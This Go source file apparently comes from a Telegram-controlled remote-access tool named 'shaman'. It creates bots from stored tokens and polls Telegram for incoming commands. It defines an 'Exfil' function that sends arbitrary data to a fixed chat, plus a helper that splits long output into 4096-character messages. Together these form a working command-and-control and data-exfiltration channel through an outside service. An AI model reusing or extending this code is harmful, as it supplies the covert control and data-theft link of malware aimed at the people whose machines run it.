package api

import (
	"strings"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/whiterabb17/shaman/package/util"
)

var (
	//Bot represents the API used for interacting with Telegram.
	Bot     *tgbotapi.BotAPI
	LBot    *tgbotapi.BotAPI
	BotCmds *tgbotapi.SetMyCommandsConfig
	BCmds   []*tgbotapi.BotCommand
	//Updates is the channel interface for Telegram commands.
	Updates tgbotapi.UpdatesChannel
)

const msgSize = 4096

func init() {
	//This is here for a reason!
	//"Bot" absolutely needs global scope
	var err error

	//"Bot" using non-HTTP Endpoint
	Bot, err = tgbotapi.NewBotAPI(util.BotToken)
	util.Handle(err)
	LBot, err = tgbotapi.NewBotAPI(util.ListToken)
	util.TBApi = Bot
	util.Handle(err)
	if util.Dbg {
		Bot.Debug = true
	} else {
		Bot.Debug = false
	}
	upd := tgbotapi.NewUpdate(0)
	upd.Limit = 0
	upd.Timeout = 30
	Updates = Bot.GetUpdatesChan(upd)
}

func Exfil(message string) {
	msg := tgbotapi.NewMessage(util.ChatID, message)
	msg.ParseMode = "HTML"
	msg.Text = message
	Bot.Send(msg)
}

func SendFragmented(msg string, sep string, prefix string, suffix string) tgbotapi.Message {
	var m tgbotapi.Message
	cfg := tgbotapi.NewMessage(util.ChatID, prefix+msg+suffix)
	cfg.ParseMode = "MarkdownV2"

	if len(msg) > msgSize {
		l := strings.Split(msg, sep)
		f := prefix
		for _, v := range l {
			if len(f)+len(v)+len(suffix) <= msgSize {
				f += v + sep
				continue
			}
			f += suffix
			cfg.Text = f
			Bot.Send(cfg)
			f = prefix
		}
		cfg.Text = f + suffix
	}

	m, _ = Bot.Send(cfg)
	return m
}
